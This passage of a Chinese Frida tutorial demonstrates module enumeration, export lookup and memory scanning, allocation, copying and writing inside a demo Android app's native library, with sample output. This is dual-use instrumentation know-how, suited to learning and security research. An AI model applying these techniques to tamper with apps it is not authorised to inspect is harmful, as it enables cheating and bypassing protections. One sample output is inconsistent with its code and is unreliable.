hooks.enumerateImports();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; Imports.length; i++) &#123;<br>            <span class="hljs-comment">//函数类型</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;type:&quot;</span>,Imports[i].type);<br>            <span class="hljs-comment">//函数名称</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;name:&quot;</span>,Imports[i].name);<br>            <span class="hljs-comment">//属于的模块</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;module:&quot;</span>,Imports[i].module);<br>            <span class="hljs-comment">//函数地址</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;address:&quot;</span>,Imports[i].address);<br>         &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>[Google Pixel::com.roysue.roysueapplication]-&gt; type: <span class="hljs-function"><span class="hljs-keyword">function</span></span><br><span class="hljs-function"><span class="hljs-title">name</span>: <span class="hljs-title">__cxa_atexit</span></span><br><span class="hljs-function"><span class="hljs-title">module</span>: /<span class="hljs-title">system</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span></span><br><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xf58f4521</span></span><br><span class="hljs-function"><span class="hljs-title">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">name</span>: <span class="hljs-title">__cxa_finalize</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">module</span>: /<span class="hljs-title">system</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xf58f462d</span>                                                                                                                                           </span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">name</span>: <span class="hljs-title">__stack_chk_fail</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">module</span>: /<span class="hljs-title">system</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xf58e2681</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function">...</span></span></span><br></code></pre></td></tr></table></figure><h4 id="enumerateExports"><a href="#enumerateExports" class="headerlink" title="enumerateExports()"></a>enumerateExports()</h4><p>该API会枚举模块中所有中的所有Export函数，示例代码如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> hooks = Module.load(<span class="hljs-string">&#x27;libhello.so&#x27;</span>);<br>        <span class="hljs-keyword">var</span> Exports = hooks.enumerateExports();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; Exports.length; i++) &#123;<br>            <span class="hljs-comment">//函数类型</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;type:&quot;</span>,Exports[i].type);<br>            <span class="hljs-comment">//函数名称</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;name:&quot;</span>,Exports[i].name);<br>            <span class="hljs-comment">//函数地址</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;address:&quot;</span>,Exports[i].address);<br>         &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>[Google Pixel::com.roysue.roysueapplication]-&gt; type: <span class="hljs-function"><span class="hljs-keyword">function</span></span><br><span class="hljs-function"><span class="hljs-title">name</span>: <span class="hljs-title">Java_com_roysue_roysueapplication_hellojni_getSum</span></span><br><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xdf2d411b</span></span><br><span class="hljs-function"><span class="hljs-title">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">name</span>: <span class="hljs-title">unw_save_vfp_as_X</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xdf2d4c43</span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">address</span>: 0<span class="hljs-title">xdf2d4209</span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-title">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span></span><br><span class="hljs-function"><span class="hljs-function"><span class="hljs-function"><span class="hljs-function">...</span></span></span></span><br></code></pre></td></tr></table></figure><h4 id="enumerateSymbols"><a href="#enumerateSymbols" class="headerlink" title="enumerateSymbols()"></a>enumerateSymbols()</h4><p>该API会枚举模块中所有中的符号表，示例代码如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> hooks = Module.load(<span class="hljs-string">&#x27;libc.so&#x27;</span>);<br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">Symbol</span> = hooks.enumerateSymbols();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">Symbol</span>.length; i++) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;isGlobal:&quot;</span>,<span class="hljs-built_in">Symbol</span>[i].isGlobal);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;type:&quot;</span>,<span class="hljs-built_in">Symbol</span>[i].type);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;section:&quot;</span>,<span class="hljs-built_in">JSON</span>.stringify(<span class="hljs-built_in">Symbol</span>[i].section));<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;name:&quot;</span>,<span class="hljs-built_in">Symbol</span>[i].name);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;address:&quot;</span>,<span class="hljs-built_in">Symbol</span>[i].address);<br>         &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br><span class="hljs-attr">isGlobal</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span><br><span class="hljs-function"><span class="hljs-title">section</span>: </span>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;13.text&quot;</span>,<span class="hljs-string">&quot;protection&quot;</span>:<span class="hljs-string">&quot;r-x&quot;</span>&#125;<br><span class="hljs-attr">name</span>: _Unwind_GetRegionStart<br><span class="hljs-attr">address</span>: <span class="hljs-number">0xf591c798</span><br><span class="hljs-attr">isGlobal</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">type</span>: <span class="hljs-function"><span class="hljs-keyword">function</span></span><br><span class="hljs-function"><span class="hljs-title">section</span>: </span>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;13.text&quot;</span>,<span class="hljs-string">&quot;protection&quot;</span>:<span class="hljs-string">&quot;r-x&quot;</span>&#125;<br><span class="hljs-attr">name</span>: _Unwind_GetTextRelBase<br><span class="hljs-attr">address</span>: <span class="hljs-number">0xf591c7cc</span><br>...<br></code></pre></td></tr></table></figure><h4 id="Module-findExportByName-exportName-Module-getExportByName-exportName"><a href="#Module-findExportByName-exportName-Module-getExportByName-exportName" class="headerlink" title="Module.findExportByName(exportName),Module.getExportByName(exportName)"></a>Module.findExportByName(exportName),Module.getExportByName(exportName)</h4><p>返回so文件中Export函数库中函数名称为exportName函数的绝对地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        Module.getExportByName(<span class="hljs-string">&#x27;libhello.so&#x27;</span>, <span class="hljs-string">&#x27;c_getStr&#x27;</span>)<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Java_com_roysue_roysueapplication_hellojni_getStr address:&quot;</span>,Module.findExportByName(<span class="hljs-string">&#x27;libhello.so&#x27;</span>, <span class="hljs-string">&#x27;Java_com_roysue_roysueapplication_hellojni_getStr&#x27;</span>));<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Java_com_roysue_roysueapplication_hellojni_getStr address:&quot;</span>,Module.getExportByName(<span class="hljs-string">&#x27;libhello.so&#x27;</span>, <span class="hljs-string">&#x27;Java_com_roysue_roysueapplication_hellojni_getStr&#x27;</span>));<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>Java_com_roysue_roysueapplication_hellojni_getStr address: <span class="hljs-number">0xdf2d413d</span><br>Java_com_roysue_roysueapplication_hellojni_getStr address: <span class="hljs-number">0xdf2d413d</span><br><br></code></pre></td></tr></table></figure><h4 id="Module-findBaseAddress-name-、Module-getBaseAddress-name"><a href="#Module-findBaseAddress-name-、Module-getBaseAddress-name" class="headerlink" title="Module.findBaseAddress(name)、Module.getBaseAddress(name)"></a>Module.findBaseAddress(name)、Module.getBaseAddress(name)</h4><p>返回name模块的基地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Module</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;libhello.so&quot;</span>;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;so address:&quot;</span>,Module.findBaseAddress(name));<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;so address:&quot;</span>,Module.getBaseAddress(name));<br>    &#125;);<br>&#125;<br>setImmediate(frida_Module,<span class="hljs-number">0</span>);<br><br>输出如下：<br>so address: <span class="hljs-number">0xdf2d3000</span><br>so address: <span class="hljs-number">0xdf2d3000</span><br><br></code></pre></td></tr></table></figure><h3 id="Memory对象"><a href="#Memory对象" class="headerlink" title="Memory对象"></a>Memory对象</h3><p>Memory的一些API通常是对内存处理</p><h4 id="Memory-scan搜索内存数据"><a href="#Memory-scan搜索内存数据" class="headerlink" title="Memory.scan搜索内存数据"></a>Memory.scan搜索内存数据</h4><p>其主要功能是搜索内存中以address地址开始，搜索长度为size，需要搜是条件是pattern，callbacks搜索之后的回调函数；此函数相当于搜索内存的功能。</p><p>我们来直接看例子，然后结合例子讲解，如下图。</p> <img src="/2021/08/25/frida%E6%95%99%E7%A8%8B/images/scan%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE.png" class=""><p>如果我想搜索在内存中112A地址的起始数据要怎么做，代码示例如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//先获取so的module对象</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = Process.findModuleByName(<span class="hljs-string">&quot;libhello.so&quot;</span>); <br>        <span class="hljs-comment">//??是通配符</span><br>        <span class="hljs-keyword">var</span> pattern = <span class="hljs-string">&quot;03 49 ?? 50 20 44&quot;</span>;<br>        <span class="hljs-comment">//基址</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;base:&quot;</span>+<span class="hljs-built_in">module</span>.base)<br>        <span class="hljs-comment">//从so的基址开始搜索，搜索大小为so文件的大小，搜指定条件03 49 ?? 50 20 44的数据</span><br>        <span class="hljs-keyword">var</span> res = Memory.scan(<span class="hljs-built_in">module</span>.base, <span class="hljs-built_in">module</span>.size, pattern, &#123;<br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">address, size</span>)</span>&#123;<br>                <span class="hljs-comment">//搜索成功</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;搜索到 &#x27;</span> +pattern +<span class="hljs-string">&quot; 地址是:&quot;</span>+ address.toString());  <br>            &#125;, <br>            <span class="hljs-attr">onError</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">reason</span>)</span>&#123;<br>                <span class="hljs-comment">//搜索失败</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;搜索失败&#x27;</span>);<br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">            </span>&#123;<br>                <span class="hljs-comment">//搜索完毕</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;搜索完毕&quot;</span>)<br>            &#125;<br>          &#125;);<br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br><br></code></pre></td></tr></table></figure><p>onMatch：function(address，size)：使用包含作为NativePointer的实例地址的address和指定大小为数字的size调用，此函数可能会返回字符串STOP以提前取消内存扫描。</p><p>onError：Function(Reason)：当扫描时出现内存访问错误时使用原因调用。</p><p>onComplete：function()：当内存范围已完全扫描时调用。</p><p>执行流程:搜索libhello.so文件在内存中的数据，搜索以pattern条件的在内存中能匹配的数据。搜索到之后根据回调函数返回数据。</p><p>我们来看看执行结果如下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">搜索到<span class="hljs-number"> 03 </span>49 ??<span class="hljs-number"> 50 </span>20<span class="hljs-number"> 44 </span>地址是:0xdf2d412a<br>搜索完毕<br></code></pre></td></tr></table></figure><p>我们要如何验证搜索到底是不是图1-5中112A地址，其实很简单。so的基址是0xdf2d3000，而搜到的地址是0xdf2d412a，我们只要df2d412a-df2d3000=112A。就是说我们已经搜索到了！</p><h4 id="搜索内存数据Memory-scanSync"><a href="#搜索内存数据Memory-scanSync" class="headerlink" title="搜索内存数据Memory.scanSync"></a>搜索内存数据Memory.scanSync</h4><p>功能与Memory.scan一样，只不过它是返回多个匹配到条件的数据。<br>代码示例如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = Process.findModuleByName(<span class="hljs-string">&quot;libhello.so&quot;</span>); <br>        <span class="hljs-keyword">var</span> pattern = <span class="hljs-string">&quot;03 49 ?? 50 20 44&quot;</span>;<br>        <span class="hljs-keyword">var</span> scanSync = Memory.scanSync(<span class="hljs-built_in">module</span>.base, <span class="hljs-built_in">module</span>.size, pattern);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;scanSync:&quot;</span>+<span class="hljs-built_in">JSON</span>.stringify(scanSync));<br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br><br>输出如下，可以看到地址搜索出来是一样的<br><span class="hljs-attr">scanSync</span>:[&#123;<span class="hljs-string">&quot;address&quot;</span>:<span class="hljs-string">&quot;0xdf2d412a&quot;</span>,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">6</span>&#125;]<br></code></pre></td></tr></table></figure><h4 id="内存分配Memory-alloc"><a href="#内存分配Memory-alloc" class="headerlink" title="内存分配Memory.alloc"></a>内存分配Memory.alloc</h4><p>在目标进程中的堆上申请size大小的内存，并且会按照Process.pageSize对齐，返回一个NativePointer，并且申请的内存如果在JavaScript里面没有对这个内存的使用的时候会自动释放的。也就是说，如果你不想要这个内存被释放，你需要自己保存一份对这个内存块的引用。</p><p>使用案例如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> r = Memory.alloc(<span class="hljs-number">10</span>);<br>        <span class="hljs-built_in">console</span>.log(hexdump(r, &#123;<br>            <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">false</span><br>        &#125;));<br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>以上代码在目标进程中申请了10字节的空间~输出如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache">           <span class="hljs-attribute">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  <span class="hljs-number">0123456789</span>ABCDEF<br><span class="hljs-attribute">e8142070</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                    .ELF......<br><br></code></pre></td></tr></table></figure><p>可以看到在0xdfe4cd40处申请了10个字节内存空间~</p><p>也可以使用：</p><p><code>Memory.allocUtf8String(str) 分配utf字符串</code></p><p><code>Memory.allocUtf16String 分配utf16字符串</code></p><p><code>Memory.allocAnsiString 分配ansi字符串</code></p><h4 id="Memory-copy内存复制"><a href="#Memory-copy内存复制" class="headerlink" title="Memory.copy内存复制"></a>Memory.copy内存复制</h4><p>如同c api memcp一样调用，使用案例如下。</p><p>从module.base中复制10个字节的内存到新年申请的r内</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//获取so模块的Module对象</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = Process.findModuleByName(<span class="hljs-string">&quot;libhello.so&quot;</span>); <br>        <span class="hljs-comment">//条件</span><br>        <span class="hljs-keyword">var</span> pattern = <span class="hljs-string">&quot;03 49 ?? 50 20 44&quot;</span>;<br>        <span class="hljs-comment">//搜字符串 只是为了将so的内存数据复制出来 方便演示~</span><br>        <span class="hljs-keyword">var</span> scanSync = Memory.scanSync(<span class="hljs-built_in">module</span>.base, <span class="hljs-built_in">module</span>.size, pattern);<br>        <span class="hljs-comment">//申请一个内存空间大小为10个字节</span><br>        <span class="hljs-keyword">const</span> r = Memory.alloc(<span class="hljs-number">10</span>);<br>        <span class="hljs-comment">//复制以module.base地址开始的10个字节 那肯定会是7F 45 4C 46...因为一个ELF文件的Magic属性如此。</span><br>        Memory.copy(r,<span class="hljs-built_in">module</span>.base,<span class="hljs-number">10</span>);<br>        <span class="hljs-built_in">console</span>.log(hexdump(r, &#123;<br>            <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">false</span><br>        &#125;));<br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br><br>输出如下。<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br>e8142070  7f <span class="hljs-number">45</span> 4c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                    .ELF......<br><br></code></pre></td></tr></table></figure><h4 id="写入内存Memory-writeByteArray"><a href="#写入内存Memory-writeByteArray" class="headerlink" title="写入内存Memory.writeByteArray"></a>写入内存Memory.writeByteArray</h4><p>将字节数组写入一个指定内存，代码示例如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;     <br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//定义需要写入的字节数组 这个字节数组是字符串&quot;roysue&quot;的十六进制</span><br>        <span class="hljs-keyword">var</span> arr = [ <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x65</span>];<br>        <span class="hljs-comment">//申请一个新的内存空间 返回指针 大小是arr.length</span><br>        <span class="hljs-keyword">const</span> r = Memory.alloc(arr.length);<br>        <span class="hljs-comment">//将arr数组写入R地址中</span><br>        Memory.writeByteArray(r,arr);<br>        <span class="hljs-comment">//输出</span><br>        <span class="hljs-built_in">console</span>.log(hexdump(r, &#123;<br>            <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">length</span>: arr.length,<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">false</span><br>        &#125;));  <br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br><br>输出如下。<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  <span class="hljs-number">72</span> 6f <span class="hljs-number">79</span> <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">65</span>                                roysue<br><br></code></pre></td></tr></table></figure><h4 id="读取内存Memory-readByteArray"><a href="#读取内存Memory-readByteArray" class="headerlink" title="读取内存Memory.readByteArray"></a>读取内存Memory.readByteArray</h4><p>将一个指定地址的数据，代码示例如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Memory</span>(<span class="hljs-params"></span>) </span>&#123;     <br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        